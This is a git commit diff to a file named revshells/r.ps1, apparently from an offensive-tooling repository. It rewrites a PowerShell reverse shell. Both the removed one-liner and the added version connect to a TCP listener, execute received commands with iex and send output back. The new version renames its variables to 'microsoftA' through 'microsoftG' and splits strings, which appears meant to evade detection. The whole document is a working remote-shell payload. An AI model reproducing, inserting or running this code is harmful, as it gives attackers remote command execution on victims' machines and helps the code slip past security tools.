d0ec73ab55b8447ceeb6bfc06025209d76730bdd
tree-chtsec <tree@chtsecurity.com>
2022-03-20 15:18:22 +0800

    revshell(ps1): redirect ALL to stdout

--- revshells/r.ps1
+++ revshells/r.ps1
@@ -1,1 +1,11 @@
-$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$microsoftA = New-Object System.Net.Sockets.TCPClient('127.0.0.1', 4444);
+$microsoftB = $microsoftA.GetStream();
+[byte[]] $microsoftC = 0..65535 | %{0};
+while(($microsoftD = $microsoftB.Read($microsoftC, 0, $microsoftC.Length)) -ne 0) {
+    $microsoftE = (New-Object -TypeName System.Text.UTF8Encoding).GetString($microsoftC, 0, $microsoftD);
+    $microsoftF = (& { iex $microsoftE } *>&1 | Out-String );
+    $microsoftG = ([text.encoding]::UTF8).GetBytes($microsoftF+'P'+'S'+' '+(pwd).Path+'>'+' ');
+    $microsoftB.Write($microsoftG, 0, $microsoftG.Length);
+    $microsoftB.Flush();
+};
+$microsoftA.Close()
